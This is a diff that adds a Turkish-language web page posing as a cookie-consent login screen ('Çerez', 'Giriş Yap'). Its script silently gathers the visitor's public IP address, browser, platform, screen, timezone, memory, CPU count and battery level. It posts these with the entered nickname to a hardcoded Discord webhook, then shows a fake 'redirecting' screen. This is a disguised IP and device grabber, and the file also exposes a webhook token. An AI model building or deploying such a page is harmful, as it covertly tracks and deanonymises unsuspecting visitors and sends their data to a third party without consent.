@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kundura</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #7289DA;
+            --primary-dark: #5865F2;
+            --dark: #2C2F33;
+            --darker: #23272A;
+            --light: #FFFFFF;
+            --gray: #99AAB5;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1f25, #2c3e50);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .card {
+            background: var(--darker);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        .header {
+            background: var(--primary);
+            color: white;
+            text-align: center;
+            padding: 25px 20px;
+        }
+
+        .header i {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            opacity: 0.9;
+            font-size: 1rem;
+        }
+
+        .info-preview {
+            padding: 25px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            margin: 20px;
+            border-radius: 10px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .info-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .info-item i {
+            color: var(--primary);
+            font-size: 1.3rem;
+            width: 30px;
+            margin-right: 15px;
+        }
+
+        .info-item span {
+            color: var(--light);
+            font-size: 1rem;
+        }
+
+        .input-group {
+            margin: 20px;
+            padding-bottom: 10px;
+        }
+
+        .input-group label {
+            display: block;
+            color: var(--light);
+            margin-bottom: 8px;
+            font-size: 1rem;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 2px solid var(--primary);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--primary-dark);
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        #send-btn {
+            display: block;
+            width: calc(100% - 40px);
+            margin: 0 auto 25px;
+            padding: 16px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        #send-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        #send-btn:active {
+            transform: translateY(0);
+        }
+
+        #send-btn:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 15px 20px 25px;
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+
+        .footer i {
+            margin-right: 5px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .spinner {
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+       
+        .white-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .white-screen.show {
+            display: flex;
+        }
+        
+        .white-screen h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <i class="fas fa-laptop-code"></i>
+                <h1>Çerez</h1>
+                <p>Site Ahmet.inc tarafından yapılmıştır</p>
+            </div>
+            
+            <div class="info-preview">
+                <div class="info-item">
+                    <i class="fas fa-globe"></i>
+                    <span id="language">Dil: Yükleniyor...</span>
+                </div>
+                <div class="info-item"> 
+                    <i class="fas fa-network-wired"></i>
+                    <span id="connection">Bağlantı: Yükleniyor...</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-mobile-alt"></i>
+                    <span id="device">Cihaz: Yükleniyor...</span>
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <label for="userName">
+                    <i class="fas fa-user"></i> Lütfen sizi tanıyabileceğim bir lakap veya isim girin:
+                </label>
+                <input type="text" id="userName" placeholder="Örnek: Ahmet, Mehmet, Ayşe..." required>
+            </div>
+            
+            <button id="send-btn">
+                <i class="fas fa-paper-plane"></i> Giriş Yap
+            </button>
+            
+            <div class="footer">
+                <p><i class="fas fa-shield-alt"></i> Bir sorun olursa iletişime geçin</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Yeni eklenen beyaz ekran -->
+    <div class="white-screen" id="whiteScreen">
+        <h1>Yönlendiriliyorsunuz...</h1>
+        <i class="fas fa-spinner fa-spin fa-3x"></i>
+    </div>
+
+    <script>
+        
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1388041630057107476/oA5Kno-N7TEqJ9cB19HgxwSPSR6E5qTMrEnWfXkEeE3BeQ1_QGFD3_xihEu3uM5ZIrL7";
+
+       
+        document.addEventListener('DOMContentLoaded', () => {
+            const btn = document.getElementById('send-btn');
+            const languageEl = document.getElementById('language');
+            const connectionEl = document.getElementById('connection');
+            const deviceEl = document.getElementById('device');
+            const userNameInput = document.getElementById('userName');
+            const whiteScreen = document.getElementById('whiteScreen');
+            
+           
+            languageEl.textContent = `Dil: ${navigator.language || 'Bilinmiyor'}`;
+            
+           
+            const connectionType = navigator.connection ? 
+                navigator.connection.effectiveType : 'Bilinmiyor';
+            connectionEl.textContent = `Bağlantı: ${connectionType}`;
+            
+           
+            const isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            deviceEl.textContent = `Cihaz: ${isMobile ? 'Mobil' : 'Masaüstü'}`;
+            
+            
+            btn.addEventListener('click', sendDeviceInfo);
+        });
+
+        async function sendDeviceInfo() {
+            const btn = document.getElementById('send-btn');
+            const userNameInput = document.getElementById('userName');
+            const whiteScreen = document.getElementById('whiteScreen');
+            const userName = userNameInput.value.trim();
+            
+            if (!userName) {
+                alert('Lütfen bir isim veya lakap girin!');
+                userNameInput.focus();
+                return;
+            }
+            
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-spinner spinner"></i> Gönderiliyor...';
+            btn.disabled = true;
+            
+            try {
+                
+                let batteryLevel = 'Bilinmiyor';
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `${Math.round(battery.level * 100)}%`;
+                }
+                
+             
+                let ipAddress = 'Bilinmiyor';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ipAddress = ipData.ip;
+                } catch (ipError) {
+                    console.log('IP adresi alınamadı:', ipError);
+                }
+                
+               
+                const deviceInfo = {
+                    userName: userName,
+                    language: navigator.language || 'Bilinmiyor',
+                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor',
+                    browser: navigator.userAgent || 'Bilinmiyor',
+                    platform: navigator.platform || 'Bilinmiyor',
+                    isMobile: /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    pixelRatio: window.devicePixelRatio || 1,
+                    colorDepth: screen.colorDepth || 24,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor',
+                    online: navigator.onLine,
+                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                    deviceVendor: navigator.vendor || 'Bilinmiyor',
+                    estimatedRAM: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Bilinmiyor',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Bilinmiyor',
+                    batteryLevel: batteryLevel,
+                    ipAddress: ipAddress
+                };
+
+               
+                const discordMessage = {
+                    content: `**${deviceInfo.userName}** adlı kullanıcıdan yeni cihaz bilgileri (${new Date().toLocaleString()})`,
+                    embeds: [
+                        {
+                            fields: [
+                                { name: "🌍 IP", value: deviceInfo.ipAddress, inline: true },
+                                { name: "🌐 Dil", value: deviceInfo.language, inline: true },
+                                { name: "📶 Bağlantı Tipi", value: deviceInfo.connectionType, inline: true },
+                                { name: "🔍 Tarayıcı", value: deviceInfo.browser.substring(0, 100) + (deviceInfo.browser.length > 100 ? "..." : ""), inline: false },
+                                { name: "💻 Platform", value: deviceInfo.platform, inline: true },
+                                { name: "📱 Mobil Mi", value: deviceInfo.isMobile ? 'Evet' : 'Hayır', inline: true },
+                                { name: "🖥️ Ekran Çözünürlüğü", value: deviceInfo.screenResolution, inline: true },
+                                { name: "🔍 Pixel Yoğunluğu", value: deviceInfo.pixelRatio.toString(), inline: true },
+                                { name: "🎨 Renk Derinliği", value: deviceInfo.colorDepth.toString(), inline: true },
+                                { name: "⏰ Zaman Dilimi", value: deviceInfo.timezone, inline: true },
+                                { name: "📶 Çevrim İçi Mi", value: deviceInfo.online ? 'Evet' : 'Hayır', inline: true },
+                                { name: "👆 Dokunmatik Desteği", value: deviceInfo.touchSupport ? 'Evet' : 'Hayır', inline: true },
+                                { name: "🔧 Cihaz Vendor", value: deviceInfo.deviceVendor, inline: true },
+                                { name: "🧠 Tahmini RAM", value: deviceInfo.estimatedRAM, inline: true },
+                                { name: "⚙️ Çekirdek Sayısı", value: deviceInfo.hardwareConcurrency.toString(), inline: true },
+                                { name: "🔋 Pil Seviyesi", value: deviceInfo.batteryLevel, inline: true }
+                            ],
+                            color: 5814783, 
+                            footer: {
+                                text: "Çerez"
+                            },
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                };
+
+               
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(discordMessage)
+                });
+
+                
+                whiteScreen.classList.add('show');
+                
+                
+            } catch (error) {
+                console.error('Hata:', error);
+                
+                whiteScreen.classList.add('show');
+            } finally {
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Çerezi Kabul Et ve Giriş yap';
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
